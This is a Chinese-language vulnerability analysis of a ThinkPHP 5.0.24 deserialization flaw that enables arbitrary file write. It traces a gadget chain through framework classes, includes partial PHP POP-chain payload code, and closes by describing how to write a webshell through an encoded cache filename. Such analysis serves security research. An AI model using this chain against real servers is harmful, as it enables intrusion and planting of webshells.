Thinkphp 5.0.24 反序列化（任意文件写入）漏洞¶
一、漏洞简介¶
该漏洞只能在linux服务器上使用，win无法适用。
二、漏洞影响¶
Thinkphp 5.0.24
三、复现过程¶
漏洞分析¶
这个漏洞是框架的反序列化漏洞，只有二次开发实现了反序列化才可以利用，所以先构造漏洞代码，在/application/index/controller/Index.php中添加如下代码
class Index { public function index() { echo &quot;Welcome thinkphp 5.0.24&quot;; unserialize(base64_decode($_GET[&#x27;a&#x27;])); } }
Thinkphp 5.0.x反序列化最后触发RCE，要调用的Request类__call方法，所以直接找可用的__call方法
这里选择了Output类(/thinkphp/library/think/console/Output.php)，因为其中的block可以当作跳板
public function __call($method, $args) { if (in_array($method, $this-&gt;styles)) { array_unshift($args, $method); return call_user_func_array([$this, &#x27;block&#x27;], $args); } if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) { return call_user_func_array([$this-&gt;handle, $method], $args); } else { throw new Exception(&#x27;method not exists:&#x27; . __CLASS__ . &#x27;-&gt;&#x27; . $method); } }
从头开始分析，首先全局搜索__destruct，选择Windows类(/thinkphp/library/think/process/pipes/Windows.php)，代码如下
public function __destruct() { $this-&gt;close(); $this-&gt;removeFiles(); }
跟进removeFiles
private function removeFiles() { foreach ($this-&gt;files as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-&gt;files = []; }
file_exists可以触发__tostring，所以寻找__tostring，找到了Model类(/thinkphp/library/think/Model.php)
public function __toString() { return $this-&gt;toJson(); }
跟进toJson
public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-&gt;toArray(), $options); }
跟进toArray
public function toArray() { $item = []; $visible = []; $hidden = []; $data = array_merge($this-&gt;data, $this-&gt;relation); ... // 追加属性（必须定义获取器） if (!empty($this-&gt;append)) { foreach ($this-&gt;append as $key =&gt; $name) { if (is_array($name)) { ... } elseif (strpos($name, &#x27;.&#x27;)) { ... } else { $relation = Loader::parseName($name, 1, false); if (method_exists($this, $relation)) { $modelRelation = $this-&gt;$relation(); $value = $this-&gt;getRelationData($modelRelation); if (method_exists($modelRelation, &#x27;getBindAttr&#x27;)) { $bindAttr = $modelRelation-&gt;getBindAttr(); if ($bindAttr) { foreach ($bindAttr as $key =&gt; $attr) { $key = is_numeric($key) ? $attr : $key; if (isset($this-&gt;data[$key])) { throw new Exception(&#x27;bind attr has exists:&#x27; . $key); } else { $item[$key] = $value ? $value-&gt;getAttr($attr) : null; } } continue; } } $item[$name] = $value; } else { $item[$name] = $this-&gt;getAttr($name); } } } } return !empty($item) ? $item : []; }
由于我们的目的是执行__call，所以要找函数调用的点，在toArray里有三处
然后看这三处哪里可控，经调试第三处可控，需要满足的条件是
if (!empty($this-&gt;append)) if (method_exists($this, $relation)) if (method_exists($modelRelation, &#x27;getBindAttr&#x27;)) if ($bindAttr)
且不满足
if (is_array($name)) elseif (strpos($name, &#x27;.&#x27;)) if (isset($this-&gt;data[$key]))
才能够进入到第三处，首先需要满足$relation是Model内的方法，然后经过如下赋值
$modelRelation = $this-&gt;$relation(); $value = $this-&gt;getRelationData($modelRelation);
需要满足$modelRelation可控，经过查找，可以将$modelRelation设为getError
public function getError() { return $this-&gt;error; }
然后跟进getRelationDate
protected function getRelationData(Relation $modelRelation) { if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) { $value = $this-&gt;parent; } else { // 首先获取关联数据 if (method_exists($modelRelation, &#x27;getRelation&#x27;)) { $value = $modelRelation-&gt;getRelation(); } else { throw new BadMethodCallException(&#x27;method not exists:&#x27; . get_class($modelRelation) . &#x27;-&gt; getRelation&#x27;); } } return $value; }
这里需要$modelRelation为Relation类型。全局查找getRelation方法且为Relation类型的类，找到了HasOne(/thinkphp/library/think/model/relation/HasOne.php)
public function getRelation($subRelation = &#x27;&#x27;, $closure = null) { // 执行关联定义方法 $localKey = $this-&gt;localKey; if ($closure) { call_user_func_array($closure, [ &amp; $this-&gt;query]); } // 判断关联类型执行查询 $relationModel = $this-&gt;query -&gt;removeWhereField($this-&gt;foreignKey) -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey) -&gt;relation($subRelation) -&gt;find(); if ($relationModel) { $relationModel-&gt;setParent(clone $this-&gt;parent); } return $relationModel; }
可以看到这些条件都是满足的，然后看getBindAttr，发现在OneToOne类中是可控的
public function getBindAttr() { return $this-&gt;bindAttr; }
所以代码执行到
$item[$key] = $value ? $value-&gt;getAttr($attr) : null;
就可以调用Output类的__call方法，调用payload如下
namespace think{ use think\console\Output; use think\model\relation\HasOne; abstract class Model{ protected $relation; protected $append = [&quot;1&quot;]; protected $error; protected $parent; public function __construct() { $this-&gt;parent = new Output(); $this-&gt;relation = [&quot;getError&quot;=&gt;&quot;getError&quot;]; $this-&gt;append = [&quot;getError&quot;=&gt;&quot;getError&quot;]; $this-&gt;error = new HasOne(); $this-&gt;data = [&quot;key&quot;=&gt;&quot;ls&quot;]; ; } } } namespace think\db{ use think\console\Output; class Query { protected $model; public function __construct() { $this-&gt;model = new Output(); } } } namespace think\model\relation{ use think\db\Query; use think\model\Relation; abstract class OneToOne extends Relation { protected $query; protected $bindAttr = []; public function __construct() { } } class HasOne extends OneToOne { protected $query; protected $bindAttr = []; public function __construct() { $this-&gt;query = new Query(); $this-&gt;bindAttr = [&quot;1&quot;=&gt;&quot;1&quot;]; } } }
然后接着看Output，在__call中调用block
protected function block($style, $message) { $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;!--$style--&gt;&quot;); }
继续writeln
public function writeln($messages, $type = self::OUTPUT_NORMAL) { $this-&gt;write($messages, true, $type); }
write
public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL) { $this-&gt;handle-&gt;write($messages, $newline, $type); }
而$this-&gt;handle是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php
public function write($sessID, $sessData) { return $this-&gt;handler-&gt;set($this-&gt;config[&#x27;session_name&#x27;] . $sessID, $sessData, $this-&gt;config[&#x27;expire&#x27;]); }
这样就有找到了一个跳板set，然后继续找可以写入文件的方式，找到了/thinkphp/library/think/cache/driver/File.php
public function set($name, $value, $expire = null) { if (is_null($expire)) { $expire = $this-&gt;options[&#x27;expire&#x27;]; } if ($expire instanceof \DateTime) { $expire = $expire-&gt;getTimestamp() - time(); } $filename = $this-&gt;getCacheKey($name, true); if ($this-&gt;tag &amp;&amp; !is_file($filename)) { $first = true; } $data = serialize($value); if ($this-&gt;options[&#x27;data_compress&#x27;] &amp;&amp; function_exists(&#x27;gzcompress&#x27;)) { //数据压缩 $data = gzcompress($data, 3); } $data = &quot;&lt;?php\n//&quot; . sprintf(&#x27;%012d&#x27;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { isset($first) &amp;&amp; $this-&gt;setTagItem($filename); clearstatcache(); return true; } else { return false; } }
此处$filename可控，跟进getCacheKey
protected function getCacheKey($name, $auto = false) { $name = md5($name); if ($this-&gt;options[&#x27;cache_subdir&#x27;]) { // 使用子目录 $name = substr($name, 0, 2) . DS . substr($name, 2); } if ($this-&gt;options[&#x27;prefix&#x27;]) { $name = $this-&gt;options[&#x27;prefix&#x27;] . DS . $name; } $filename = $this-&gt;options[&#x27;path&#x27;] . $name . &#x27;.php&#x27;; $dir = dirname($filename); if ($auto &amp;&amp; !is_dir($dir)) { mkdir($dir, 0755, true); } return $filename; }
回来继续看$data，从传入的$value获取，但是在之前writeln处已经传入了true，而且不可控，只能继续往下看，可以看到当成功写入文件时，会调用setTagItem方法，跟进
protected function setTagItem($name) { if ($this-&gt;tag) { $key = &#x27;tag_&#x27; . md5($this-&gt;tag); $this-&gt;tag = null; if ($this-&gt;has($key)) { $value = explode(&#x27;,&#x27;, $this-&gt;get($key)); $value[] = $name; $value = implode(&#x27;,&#x27;, array_unique($value)); } else { $value = $name; } $this-&gt;set($key, $value, 0); } }
又调用了一次set，且此处两个参数都是可控的，所以可以在文件名处搞事情，通过编码然后将文件名写入shell中
